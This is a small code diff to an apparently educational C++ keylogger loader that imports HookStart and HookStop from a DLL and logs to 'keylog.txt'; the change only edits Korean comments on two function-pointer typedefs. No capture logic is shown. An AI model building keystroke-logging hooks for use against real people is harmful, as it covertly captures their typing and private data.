@@ -12,8 +12,8 @@ using namespace std;
 #define DEF_HOOKSTOP "HookStop"
 #define LOG_FILE "keylog.txt"
 
-typedef void (*PFN_HOOKSTART)(); //dll 내의 특정함수를 가져오기 위한 함수
-typedef void (*PFN_HOOKSTOP)();
+typedef void (*PFN_HOOKSTART)(); //함수포인터 
+typedef void (*PFN_HOOKSTOP)(); //dll 내의 특정함수를 가져오기 위한 함수
 
 int main(int argc, char** argv)
 {
